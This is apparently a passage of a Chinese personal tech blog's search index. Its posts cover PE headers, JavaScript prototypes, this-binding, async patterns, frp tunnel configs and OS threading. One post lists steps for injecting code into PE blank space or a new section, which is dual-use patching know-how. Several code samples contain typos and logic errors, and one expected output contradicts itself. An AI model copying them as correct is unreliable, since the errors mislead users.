初始化实际提交的大小 DWORD LoaderFlags; // 调试相关 DWORD NumberOfRvaAndSizes; // 目录项目数 IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; 程序真正入口：ImageBase 内存镜像基址 + AddressOfEntryPoint 程序入口 _IMAGE_SECTION_HEADER(节表)123456789101112131415typedef struct _IMAGE_SECTION_HEADER &#123; BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; union &#123; DWORD PhysicalAddress; DWORD VirtualSize; &#125; Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics;&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; 空白区域添加代码构造跳转地址公式 要跳转的地址 - E8指令当前的地址 - 5 新增节新增节的步骤判断是否有足够的空间，可以添加一个节表在节表中新增一个成员修改PE头中节的数量修改SizeOfImage的大小在原有数据的最后，新增一个节的数据（内存对齐的整数倍）修正新增节表的属性","categories":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/categories/Windows-PE/"}],"tags":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/tags/Windows-PE/"}]},{"title":"原型链的应用","slug":"原型链的应用","date":"2023-04-22T02:51:25.000Z","updated":"2023-04-22T16:42:19.311Z","comments":true,"path":"85f7c1f6.html","link":"","permalink":"http://example.com/85f7c1f6.html","excerpt":"面向对象编程思维提高代码的可复用率 &#x3D;&gt; 更加合理的数据关系隐式原型和显式原型对象的隐式原型和构造函数的显式原型的连接原型链机制核心 a. new: 执行前绑定this并指向空对象, 将对象的隐式原型指向函数的显式原型 b. [[GET]]","text":"面向对象编程思维提高代码的可复用率 &#x3D;&gt; 更加合理的数据关系隐式原型和显式原型对象的隐式原型和构造函数的显式原型的连接原型链机制核心 a. new: 执行前绑定this并指向空对象, 将对象的隐式原型指向函数的显式原型 b. [[GET]] Object和Function关键点Object.prototype.__proto__ &#x3D; null &#x3D;&gt; 原型链的终点; 不是所有对象都是Object的实例Function.prototype.__proto__ &#x3D; Object.prototype &#x3D;&gt; new Object()Object.__proto__ &#x3D; Function.prototype &#x3D;&gt; new Function()Function.__proto__ &#x3D; Function.prototype &#x3D;&gt; 指向自己, 执行前通过代码注入 instanceof方法instanceofa instanceof Func本质：递归作用：判断 a 是不是 Func 的一个实例 s1.__proto__ &#x3D; Student.prototype -&gt; falseStudent.prototype.__proto__ &#x3D; Object.prototype -&gt; true 1234567891011121314151617181920function Student(name, sex, age, major) &#123; this.name = name; this.sex = sex; this.age = age; this.major = major;&#125;var s1 = new Student(&#x27;jack&#x27;, 18, &#x27;male&#x27;, &#x27;cs&#x27;);var s2 = new Student(&#x27;lucy&#x27;, 20, &#x27;female&#x27;, &#x27;english&#x27;);// 自己封装instanceofObject.myInstanceOf = function(obj, Func) &#123; if(obj === null) return false; if(Object.getPrototypeOf(obj) === Fun.prototype) &#123; return true; &#125;else &#123; return myInstanceOf(Object.getPrototypeOf(obj, Func)); &#125;&#125;// Object.getPrototypeOf() -&gt; 返回对象的隐式原型 数组和类数组数组和类数组的区别本质上是原型链上的区别 1234567891011121314151617181920212223var a = [&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;];// 数组a = &#123; &#x27;0&#x27;: 1, &#x27;1&#x27;: 2, &#x27;2&#x27;: 3, length: 3, __proto__: Array.prototype&#125;;// 类数组a = &#123; &#x27;0&#x27;: 1, &#x27;1&#x27;: 2, &#x27;2&#x27;: 3, length: 3, __proto__: xxx&#125;;function demo() &#123; console.log(arguments);&#125;demo(1, 2, 3); 隐式原型的修改隐式原型的修改Object.getPrototypeOf(obj) -&gt; 返回参数对象的隐式原型Object.setPrototypeOf(obj, obj) &#x2F;&#x2F; 不推荐Object.create() &#x2F;&#x2F; 返回一个以obj为隐式原型的值的对象如何得到一个没有任何属性的对象 var o &#x3D; Object.create(null); [[PUT]]&amp;&amp;[[GET]][[PUT]][[PUT]] -&gt; LHS 左查询判断对象中有没有属性如果有, 就找到并返回该地址如果没找到(1) 沿着原型链找A. 找到这个属性(a). 如果是基本类型 -&gt; 覆盖 -&gt; 在对象自身创建这个属性并返回(b). 引用类型：xxx. 对引用类型的引用 -&gt; 覆盖yyy. 对引用类型的访问 -&gt; 修改(2) 没有找到 -&gt; 直到原型链终点 -&gt; 给对象自身创建一个 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950var bar = new Object();// 找到该属性并且是基本类型 // bar.prototype.b = 1;// bar.b = 2;// console.log(bar)/** 返回结果: b为基本类型, 会在自身创建属性并返回, 原型链上不变 * bar &#123; * b: 2, * [[prototype]]: Object &#123; * b: 1 * &#125; * &#125; */// 找到该属性并且是引用类型 -- 访问Object.prototype.demo = &#123; m: 1,&#125;// bar.demo.m = 2;// console.log(Object.prototype);/** 返回结果 对引用类型的访问会修改 * Object &#123; * demo: &#123; * m: 2, * &#125; * &#125; */// 找到该属性 -- 对引用类型的引用bar.demo = 2;console.log(bar);/** 返回结果 对引用类型的引用会覆盖 * bar &#123; * demo: 2, * [[prototype]]: Object &#123; * demo: &#123; m: 1 &#125;, * &#125; * &#125; */bar.a = 1 // 会在对象自身创建/** 返回 * bar &#123; * a: 1, * [[prototype]]: Object * &#125; */ 面试题面试题 - 01123456789101112131415161718function A() &#123;&#125;A.prototype.n = 3;A.prototype.add1 = function () &#123; this.n++; // this.n = this.n + 1 RHS [[GET]] // 左边this.n =&gt; LHS -&gt; [[PUT]] =&gt; 基本类型(自身创建覆盖) =&gt; A &#123; n: 4 &#125;&#125;var a = new A();var b = new A();var c = new A()a.add1();/** 分析 通过点(.)的方式调用函数会绑定this * (1). a.add1 -&gt; 属于RHS: 读操作，获取a.add1的返回值 * (2). RHS -&gt; [[GET]] -&gt; a.[[__proto__]] -&gt; A.prototype.[[__proto__]] */b.add1();console.log(a.n, b.n, c.n); // 4, 4, 3 面试题 - 021234567891011function A () &#123;&#125;;A.prototype.m = &#123; t: 1,&#125;;A.prototype.add2 = function() &#123; this.m = &#123;&#125;; // 写操作 =&gt; 对引用对象的引用 =&gt; 覆盖 =&gt; d &#123; m: &#123;&#125;, prototype: Object &#123; add2: f(), m: &#123;t: 1&#125;&#125;&#125; // LHS -&gt; [[PUT]]&#125;var d = new A();d.add2(); // RHS =&gt; [[GET]] -&gt; d.[[__proto__]] -&gt; A.prototypeconsole.log(d.m.t); // undefined 面试题 - 03123456789101112131415161718function Person(name, age) &#123; this.name = name; this.age = age; this.eat = function() &#123; console.log(age + &quot;岁的&quot; + name + &quot;在吃饭.&quot;); &#125;;&#125;Person.run = function() &#123;&#125;;Person.prototype.walk = function () &#123;&#125;;let p1 = new Person(&#x27;jsliang&#x27;, 24);let p2 = new Person(&#x27;jsliang&#x27;, 24);// 对象的引用的值判断 -&gt; 判断地址console.log(p1.eat === p2.eat); // false =&gt; new的时候指向不同的地址console.log(p1.run === p2.run); // trueconsole.log(p1.walk === p2.walk); // true 面试题 - 04123456789101112function foo() &#123; this.some = &#x27;222&#x27;; // 能访问到 let ccc = &#x27;ccc&#x27;; foo.obkorou1= &#x27;obkorou1&#x27;; foo.prototype.a = &#x27;aaa&#x27;; // 能访问到&#125;foo.koro = &#x27;扣肉&#x27;;foo.prototype.test = &#x27;test&#x27; // 被修改let foo1 = new foo();foo.prototype.test = &#x27;test2&#x27;; // 能访问到// foo1 访问到哪些属性?","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"原型链","slug":"原型链","date":"2023-04-16T13:12:07.000Z","updated":"2023-04-22T09:17:05.792Z","comments":true,"path":"bf8cf30.html","link":"","permalink":"http://example.com/bf8cf30.html","excerpt":"理解原型链理解new关键字的作用机制（写）理解[[GET]]（读）","text":"理解原型链理解new关键字的作用机制（写）理解[[GET]]（读） new的执行流程123456function foo() &#123; console.log(1);&#125;const a = new foo(); // 第二步用代码表示：this.__proto__ = foo.prototype； 返回值：this指向的对象的引用console.log(a); new的执行流程绑定this为空对象让空对象[[Prototype]](__protot__) –&gt; 函数的prototype属性 (1) 所有对象都有[[Prototype]](隐式属性 __protot__) -&gt; 所有对象本质上都是new出来的 (2) 所有的函数对象 -&gt; prototype正常执行函数如果函数返回的基本类型，返回this的值，否则返回原函数的返回值 new执行流程图解 [[GET]]1234567function foo() &#123; console.log(1);&#125;const a = new foo(); a.b // 不报错返回undefinedconsole.log(a.b) // 访问对象属性的本质，底层帮调用 [[GET]]流程判断对象里面有没有判断它的__proto__指向的对象里面有没有 面试题123456789101112131415Object.prototype.a = function () &#123; console.log(&#x27;a&#x27;);&#125;;Function.prototype.b = function () &#123; console.log(&#x27;b&#x27;);&#125;;var F = new function() &#123; &#125;;var f = new F();console.log(f.a) // 打印aconsole.log(f.a) // 打印undefinedconsole.log(F.a) // 打印aconsole.log(F.b) // 打印b 原型链面试题图解 原型链的终点是：Object.prototype.[[prototype]] &#x3D; nullObject.prototype.__proto__ &#x3D; null; &#x2F;&#x2F; 不是所有对象都是Object的实例Function.prototype.__proto__ &#x3D; Object.prototype; &#x2F;&#x2F; new Object()Object.__proto__ &#x3D; Function.prototype; &#x2F;&#x2F; new Funtion()Function.__proto__ &#x3D; Function.prototype","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"变量","slug":"变量","date":"2023-04-16T02:18:20.000Z","updated":"2023-04-16T12:53:28.963Z","comments":true,"path":"13ffbe88.html","link":"","permalink":"http://example.com/13ffbe88.html","excerpt":"变量的本质深拷贝垃圾回收","text":"变量的本质深拷贝垃圾回收 变量的本质栈(stack)的特性结构性强，内存连续寻址速度快数据稳定容量小 原始类型原始类型存于栈中原始类型不可修改; 无法直接修改指向内存中的值, 需要新开辟一块内存类型typeof返回值对象包装器Null“object”N&#x2F;AUndefined“undefined”N&#x2F;ABoolean“boolean”BooleanNumber“number”NumberBigInt“bigint”BigIntString“string”StringSymbol“symbol”Symbol 堆(heap)的特性类似于书架存储以坨为单位容量大不同数据间内存不连续 引用类型在js中引用类型指的是对象（Object）; 示例代码-011234567891011121314var b1 = 1, b2 = b1; // RHS right head-side search 右查询（本质：读了内存中存的值）b2 = b1; // 本质是在内存中指向了新的数据（2），旧数据（1）将被回收console.log(b1, b2);var r1 = &#123; a: 1, &#125;, r2 = r1; // 程序本身只允许访问栈，无法访问堆；栈和堆通过标识符建立连接r2.a = 2; // 因为r1和r2同时指向了堆中的数据，所以修改r2，r1随之改变console.log(r1.a, r2.a) 字符串(特殊)字符串本质上是存放在堆中，但是它是一个原始类型，原始类型不能直接修改栈中的数据，而是新建了一个标识符并指向了堆中的新数据 示例代码-021234var a = &#x27;hello word&#x27;, b = a;b = &#x27;hello&#x27;; // 栈中会新建标识符指向新数据，旧数据则被回收consoel.log(a, b); 变量总结知识总结数据组织的方式不同 – 栈中的内存是连续的，堆中不是用户权限不同 – 用户能读取栈中的数据不能读取堆中的数据大小不同 – 栈的空间小堆的空间大寻址速度不同 – 栈的寻址速度快而堆的寻址速度慢作用不同 – 栈中存的是基本类型、引用类型的标识符以及字符串的标识符；堆中存放大小不确定的数据 值传递和引用传递所谓的引用传递取决于传递的是值还是地址；在javascript中本质上就是值传递（读栈stack内存中的值） 示例代码-01123456789101112131415function change1(arg) &#123; arg = 200;&#125;function change2(arg)&#123; arg.a = 200;&#125;var foo = 100;var bar = &#123; a: 100 &#125;;change1(foo);change2(bar);console.log(foo, bar); 深拷贝&amp;浅拷贝代码示例1234567891011121314151617181920212223242526272829303132333435363738394041var person1 = &#123; age: 28, hobby: &#x27;学习&#x27;, son: &#123; age: 3, hobby: &#x27;drink milk&#x27;, friends: [&#x27;jack&#x27;, &#x27;lucy&#x27;], &#125;,&#125;// 浅拷贝function clone2(obj) &#123; var clonePerson = &#123;&#125;; for(var key in obj) &#123; clonePerson[key] = obj[key]; &#125; return clonePerson;&#125;var newPerson = clonePerson(person1);newPerson.age = 18;console.log(person1.age);newPerson.son.age = 100; // 会改变，son是一个object属于引用类型存放于堆中，newPerson.son和person1.son指向同一个console.log(newPerson.son.age);// 利用递归实现深拷贝function clone2(obj) &#123; if(typeof obj !== &#x27;object&#x27; || obj === null) &#123; return obj; &#125; var clone = Array.isArray(obj) ? [] : &#123;&#125;; for(var key in obj) &#123; if(typeof obj[key] === &#x27;object&#x27;) &#123; clone2(obj[key]) &#125;else &#123; clone[key] = obj[key]; &#125; &#125; return clone;&#125; 垃圾回收stack存储基本变量和引用类型的指向;heap存储复杂数据和字符串;stack会自动回收,heap借助垃圾回收机制进行回收，但需要一定的手动操作; 视频地址变量的本质&深拷贝&垃圾回收https://www.bilibili.com/video/BV1Ed4y1x7oN/?p=6&spm_id_from=pageDriver&vd_source=cb73e5c2249f330a061d8900da3573a8","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"Promise异步任务并发","slug":"Promise异步任务并发","date":"2023-04-05T05:23:21.000Z","updated":"2023-04-16T12:54:15.168Z","comments":true,"path":"5d76cec.html","link":"","permalink":"http://example.com/5d76cec.html","excerpt":"背景设计一个方法doSomething来限制异步任务的最大并发数","text":"背景设计一个方法doSomething来限制异步任务的最大并发数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576function sleep (timeout: number, taskName: string) &#123; return new Promise&lt;void&gt;(resolve =&gt; &#123; console.log(`$&#123;taskName&#125;开始啦`); setTimeout(() =&gt; &#123; console.log(`$&#123;taskName&#125;结束啦`); resolve(); &#125;, timeout) &#125;);&#125;const tasks = [ () =&gt; sleep(1000, &#x27;睡觉&#x27;), () =&gt; sleep(2000, &#x27;吃饭&#x27;), () =&gt; sleep(3000, &#x27;打游戏&#x27;), () =&gt; sleep(5000, &#x27;写代码&#x27;), () =&gt; sleep(7000, &#x27;做运动&#x27;),];async function doSomething(tasks:(()=&gt;Promise&lt;void&gt;)[], limit=2) &#123; // 正在执行中的任务的集合 const taskPool = new Set(); for (const task of tasks) &#123; const promise = task(); taskPool.add(promise); promise.then(() =&gt; taskPool.delete(promise)); if (taskPool.size &gt;= limit) &#123; await Promise.race(taskPool); &#125; &#125; return Promise.all(taskPool);&#125;/** 如果存在同步任务情况async function doSomething(tasks:(()=&gt;Promise&lt;void&gt;)[], limit=2) &#123; // 正在执行中的任务的集合 const taskPool = new Set(); for (const task of tasks) &#123; const promise = task(); const p = Promise.resolve(promise) // 包装Promise, 同步任务直接返回 taskPool.add(p); promise.then(() =&gt; taskPool.delete(p)); if (taskPool.size &gt;= limit) &#123; await Promise.race(taskPool); &#125; &#125; return Promise.all(taskPool);&#125; */doSomethin(tasks).then(() =&gt; &#123; console.log(&#x27;任务全部执行完了&#x27;);&#125;)// 加载图片function getTasks(urls) &#123; const tasks = []; urls.forEach(url =&gt; &#123; tasks.push(() =&gt; &#123; new Promise(resolve =&gt; &#123; const img = new Image(); img.onload = () =&gt; &#123; resolve(); &#125; img.src = url; &#125;) &#125;) &#125;) return tasks;&#125;doSomething(getTasks([&#x27;xxxx.jpg&#x27;, &#x27;xxxx.png&#x27;])).then(() =&gt; &#123; console.log(&#x27;全部执行完了&#x27;);&#125;)// 加载图片 视频地址【Promise的异步任务并发限制还不会写？还只会Promise.all ？今天一次性教会你实现思路与细节！】ttps://www.bilibili.com/video/BV1i24y1L72L/?share_source=copy_web&vd_source=a11f39cbd36d0048998b780fa95bc7df","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"async/await 学习","slug":"async-await","date":"2023-04-04T14:40:36.000Z","updated":"2023-04-04T15:26:12.522Z","comments":true,"path":"ca9ee217.html","link":"","permalink":"http://example.com/ca9ee217.html","excerpt":"async 函数可能包含 0 个或者多个 await 表达式。await 表达式会暂停整个 async 函数的执行进程并出让其控制权，只有当其等待的基于 promise 的异步操作被兑现或被拒绝之后才会恢复进程。promise 的解决值会被当作该 await 表达式的返回值。使用 async&#x2F;await 关键字就可以在异步代码中使用普通的 try&#x2F;catch 代码块。","text":"async 函数可能包含 0 个或者多个 await 表达式。await 表达式会暂停整个 async 函数的执行进程并出让其控制权，只有当其等待的基于 promise 的异步操作被兑现或被拒绝之后才会恢复进程。promise 的解决值会被当作该 await 表达式的返回值。使用 async&#x2F;await 关键字就可以在异步代码中使用普通的 try&#x2F;catch 代码块。 备注await关键字只在 async 函数内有效。如果你在 async 函数体之外使用它，就会抛出语法错误 SyntaxError。 备注async&#x2F;await的目的为了简化使用基于 promise 的 API 时所需的语法。async&#x2F;await 的行为就好像搭配使用了生成器和 promise。 示例12345678910111213141516171819202122232425262728293031323334353637let count = 0;function request (url) &#123; return new Promise(resolve =&gt; &#123; setTimeout(() =&gt; &#123; resolve(url + count ++); &#125;, 500); &#125;);&#125;// 使用async/await语法糖// async function run () &#123;// const res1 = await request(&#x27;1111&#x27;);// const res2 = await request(res1);// console.log(res2);// &#125;// run();// 基于生成器函数模拟async/awaitfunction* generate() &#123; const res = yield request(&#x27;1111&#x27;); const res2 = yield request(res); console.log(res2);&#125;// 使用递归实现连续调用function run () &#123; const g = generate(); function exec (params) &#123; const &#123; value, done &#125; = g.next(); if (!done) &#123; value.then(res =&gt; exec(res)); &#125; &#125; exec();&#125;run();","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"this 指向","slug":"this指向学习","date":"2023-04-01T12:15:04.000Z","updated":"2023-04-03T16:09:03.414Z","comments":true,"path":"6cfe1ad3.html","link":"","permalink":"http://example.com/6cfe1ad3.html","excerpt":"this到底指向什么？ 函数在调用时，JavaScript会默认给this绑定一个值this的绑定和定义的位置（编写的位置）没有关系this的绑定和调用方式以及调用的位置有关系this是在运行时被绑定的","text":"this到底指向什么？ 函数在调用时，JavaScript会默认给this绑定一个值this的绑定和定义的位置（编写的位置）没有关系this的绑定和调用方式以及调用的位置有关系this是在运行时被绑定的 this 绑定规则this的绑定规则绑定一：默认绑定绑定二：隐式绑定绑定三：显示绑定绑定四：new绑定 默认绑定独立的函数调用可以理解成函数没有被绑定到某个对象上进行调用 严格模式，独立调用的函数中的this指向的是undefined 12345678910111213141516171819202122// 1. 普通函数被独立调用function foo () &#123; console.log(&#x27;foo &#x27;, this);&#125;;foo(); // 指向window// 2. 函数定义在对象中，但是独立调用const obj = &#123; name: &#x27;why&#x27;, bar: function () &#123; console.log(&#x27;bar &#x27;, this); &#125;,&#125;;// obj.bar(); // 指向obj对象const baz = obj.bar;baz() // 指向window// 3. 严格模式，独立调用的函数中的this指向的是undefined 案例案例一12345function () &#123; console.log(this);&#125;foo() 案例二123456789101112131415function test1 () &#123; console.log(this); test2();&#125;function test2 () &#123; console.log(this); test3();&#125;function test3 () &#123; console.log(this);&#125;test1(); 案例三12345678910111213// 高阶函数function foo (func) &#123; func()&#125;const obj = &#123; name: &#x27;why&#x27;, bar: function () &#123; console.log(this); &#125;&#125;foo(obj.bar); // 属于独立调用 隐式绑定通过某个对象进行调用；也就是它的调用位置中，是通过某个对象发起的函数调用 隐式绑定的前提条件必须在调用的对象内部有一个对函数的引用（比如一个属性）；如果没有这样的引用，在进行调用时，会报找不到该函数的错误；正是通过这样的引用，间接的将this绑定到这个对象上； 1234567891011// 隐式绑定function foo () &#123; console.log(this);&#125;const obj = &#123; bar: foo,&#125;obj.bar(); // 指向obj对象 案例案例一123456789101112131415function foo () &#123; console.log(this);&#125; const obj = &#123; name: &#x27;obj&#x27;, foo: foo, &#125; const obj2 = &#123; name: &#x27;obj2&#x27;, obj1: obj2, &#125; obj2.obj1.foo(); // 指向obj1对象 案例21234567891011function foo () &#123; console.log(this);&#125;const obj1 = &#123; name: &#x27;obj1&#x27;, foo: foo,&#125;const bar = obj1.foo;bar(); // 指向obj1对象 显式绑定不希望在对象内部包含这个函数的引用，同时又希望在这个对象上进行强制调用；可以使用显式绑定 call和apply方法第一个参数是相同的，要求传入一个对象这个对象的作用就是给this准备的在调用这个函数时，会将this绑定到这个传入的对象上后面的参数；apply为数组，call为参数列表 1234567891011121314151617function foo (name, age, height) &#123; console.log(&#x27;foo 函数被调用 &#x27;, this); console.log(&#x27;打印参数 &#x27;, name, age, height);&#125;// ()调用// foo(&#x27;why&#x27;, 18, 180);// apply// 第一个参数：绑定this// 第二个参数：传入额外的实参，以数组的形式// foo.apply(&#x27;apply&#x27;, [&#x27;kobe&#x27;, 30, 198])// call// 第一个参数：绑定this// 第二个参数：后续的参数以多参数的形式传递，会作为实参foo.call(&#x27;call&#x27;, &#x27;james&#x27;, 35, 205); bind 的显示绑定如果我们希望一个函数总是显式的绑定到一个对象上，可以使用 bind 方法；bind()方法创建一个新的绑定函数(bound function, BF)绑定函数是一个exotic function object(怪异函数对象，ECMAScript 2015 中的术语)在bind() 被调用时，这个新函数的this被指定为bind() 的第一个参数，而其余参数将作为新函数的参数，供调用时使用 1234567891011121314function foo (name, age, height) &#123; console.log(&#x27;foo &#x27;, this);&#125;const obj = &#123; &#x27;name&#x27;: &#x27;why&#x27; &#125;;// 需求：调用foo时，总是绑定到obj对象身上（不希望obj对象上有函数）// 1. bind函数的基本使用const bar = foo.bind(obj);bar(); // this --&gt; obj// 2. bind函数的其他参数const test = foo.bind(obj, &#x27;kobe&#x27;, 30, 198)test() new绑定JavaScript中的函数可以当做一个类的构造函数来使用，也就是使用new关键字 使用new关键字调用函数执行的操作创建新的空对象；新对象会被执行prototype连接；新对象会绑定到函数调用的this上（this绑定在这个步骤完成）；没有显示返回非空对象时，默认返回这个对象； 123456789101112131415function foo () &#123; this.name = &#x27;why&#x27;; console.log(this);&#125;new foo(); // 指向foo对象// 创建Personfunction Person (name) &#123; console.log(this); // Person &#123;&#125; this.name = name; // Person &#123; name: &#x27;why&#x27; &#125;&#125;const p = new Person(&#x27;why&#x27;);console.log(p); 内置函数的调用绑定","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"openProcess","slug":"openProcess","date":"2023-04-01T11:41:00.000Z","updated":"2023-04-07T14:08:38.858Z","comments":true,"path":"59bbde9c.html","link":"","permalink":"http://example.com/59bbde9c.html","excerpt":"openProcess","text":"openProcess openProcess 释义","categories":[{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/categories/Windows-API/"}],"tags":[{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/tags/Windows-API/"}]},{"title":"createProcess","slug":"createProcess","date":"2023-04-01T11:06:25.000Z","updated":"2023-04-01T11:48:29.945Z","comments":true,"path":"e0165a92.html","link":"","permalink":"http://example.com/e0165a92.html","excerpt":"createProcess","text":"createProcess createProcess 释义","categories":[{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/categories/Windows-API/"}],"tags":[{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/tags/Windows-API/"}]},{"title":"shadowsocket配置","slug":"shadowsocket配置","date":"2023-04-01T07:08:18.000Z","updated":"2023-04-01T10:53:09.625Z","comments":true,"path":"fc41ab04.html","link":"","permalink":"http://example.com/fc41ab04.html","excerpt":"","text":"记录一下shadowsocket的配置 为了愉快的使用Google 国内[209]配置 国内[209]配置 server配置[common]bind_port &#x3D; 7001client配置[common]server_addr &#x3D; 127.0.0.1server_port &#x3D; 7000[ssh]type &#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 22remote_port &#x3D; 6000 硅谷[184]配置 硅谷[184]配置 新加坡[188]server配置[common]bind_port &#x3D; 7001新加披[188]client配置[common]server_addr &#x3D; 国内[209]server_port &#x3D; 7001[frp_shadow]type &#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 8890remote_port &#x3D; 8889[frp_shh]type &#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 6002remote_port &#x3D; 6667 新加坡[188]配置 新加坡[188]配置 server配置bind_port &#x3D; 7000新加坡[188]client配置[common]server_addr &#x3D; [硅谷]184server_port &#x3D; 7001[frp_client_188]type &#x3D; tcplocal_ip &#x3D; 1270.0.1local_port &#x3D; 22remote_port &#x3D; 6002[shadowrocket_client_188]type &#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 8388remote_port &#x3D; 8890","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"操作系统 - 调度算法的评价指标","slug":"操作系统-调度算法的评价指标","date":"2022-08-03T15:44:00.000Z","updated":"2023-03-25T14:35:06.489Z","comments":true,"path":"10785.html","link":"","permalink":"http://example.com/10785.html","excerpt":"","text":"操作系统 - 调度算法的评价指标 调度算法的评价指标CPU利用率 系统吞吐量 周转时间 周转时间，是指从作业被提交给系统开始，到作业完成为止的这段时间间隔它包括四个部分：作业在外存后备队列上等待作业调度（高级调度）的时间、进程在就绪队列上等待进程调度（低级调度）的时间、进程在CPU上执行的时间、进程等待I&#x2F;O操作完成的时间。后三项在一个作业的整个处理过程中，可能发生多次。 周转时间 &#x3D; 作业完成时间 - 作业提交时间 周转时间、平均周转时间 平均周转时间 带权周转时间、平均带权周转时间 等待时间 等待时间，指进程&#x2F;作业处于等待处理机状态时间之和，等待时间越长，用户满意度越低。 对于进程来说，等待时间就是指进程建立后等待被服务的时间之和，在等待I&#x2F;O完成的期间其实进程也是在被服务的，所以不计入等待时间 对于作业来说，不仅要考虑建立进程后的等待时间，还要加上作业在外存后备队列中等待的时间。 一个作业总共需要被CPU服务多久，被I&#x2F;O设备服务多久一般是确定不变的，因此调度算法其实只会影响作业&#x2F;进程的等待时间。当然，前面指标类似，也有“平均等待时间”来评价整体性能。 响应时间 对于计算机用户来说，会希望自己提交的请求（比如通过键盘输入了一个调试命令）尽早地开始被系统服务、回应 响应时间，指从用户提交请求到首次产生响应所用地时间。 知识回顾","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"bilibili大学","slug":"bilibili大学","permalink":"http://example.com/tags/bilibili%E5%A4%A7%E5%AD%A6/"}],"author":"Dokey_"},{"title":"操作系统 - 线程概念多线程模型","slug":"操作系统-线程概念多线程模型","date":"2022-08-01T15:44:00.000Z","updated":"2023-03-25T14:35:06.492Z","comments":true,"path":"54937.html","link":"","permalink":"http://example.com/54937.html","excerpt":"","text":"操作系统 - 线程概念多线程模型 线程概念多线程模型什么是线程，为什么要引入线程 可以把线程理解为“轻量级进程” 线程是一个基本的CPU执行单元， 也是程序执行流的最小单位 引入线程之后不仅是进程之间可以并发，进程内的各线程之间也可以并发，从而进一步提升了系统的并发度，使得一个进程内也可以并发处理各种任务 引入线程之后，进程只作为除CPU之外的系统资源的分配单元（如打印机、内存地址空间等都是分配给进程的） 引入线程机制后，有什么变化资源分配、调度 传统进程机制中，进程是资源分配、调度的基本单位 引入线程后，进程是资源分配的基本单位，线程是调度的基本单位 并发性 传统进程机制中，只能进程间并发 引入线程后，各线程间也能并发，提升了并发度 系统开销 传统的进程间并发，需要切换进程的运行环境，系统开销很大 线程间并发，如果同一进程内的线程切换，则不需要切换进程环境，系统开销小 引入线程后，并发所带来的系统开销减小 线程有哪些重要的属性 线程是处理机调度的单位 多CPU计算机中，各个线程可占用不同的CPU 每个线程都有一个线程ID、线程控制块（TCB） 线程也有就绪、阻塞、运行三种状态 线程几乎并拥有系统资源 同一进程的不同线程间共享进程的资源 由于共享内存地址空间，同一进程中的线程通信甚至无需系统干预 同一进程中线程切换，不会引起进程切换 不同进程中的线程切换，会引起进程切换 切换同进程内的线程，系统开销很小 切换进程，系统开销较大 线程的实现方式在同时支持用户级线程和内核级线程的系统中，可采用二者组合的方式：将n个用户级线程映射到m个内核级线程上（n &gt; m） 操作系统只“看得见”内核级线程，因此只有内核级线程才是处理机？ 用户级线程（User-Level Thread, ULT） 用户级线程由应用程序通过线程库实现。所有的线程管理工作都由应用程序负责（包括线程切换） 用户级线程中，线程切换可以在用户态下即可完成，无需操作系统干预。 在用户看来是有多个线程，但是在操作系统内核看来，是意识不到线程的存在。（用户级线程对用户不透明，对操作系统透明） “用户级线程”就是“从用户视角能看到的线程” 内核级线程 内核级线程的管理工作由操作系统内核完成。线程的调度、切换工作都由内核负责，因此内核级线程的切换必然需要在核心态下才能完成。 “内核级线程”就是“从操作系统内核视角看能看到的线程” 多线程模型多对一模型 多个用户级线程映射到一个内核级线程。每个用户进程只对应一个内核级线程 优点用户级线程的切换在用户空间即可完成，不需要切换至核心态，线程管理的系统开销小，效率高 缺点当一个用户级线程被阻塞后，整个进程都会被阻塞，并发度不高。多个线程不可在多核处理机上并行运行 一对一模型 一个用户及线程映射到一个内核级线程。每个用户进程有与用户级线程同数量的内核级线程 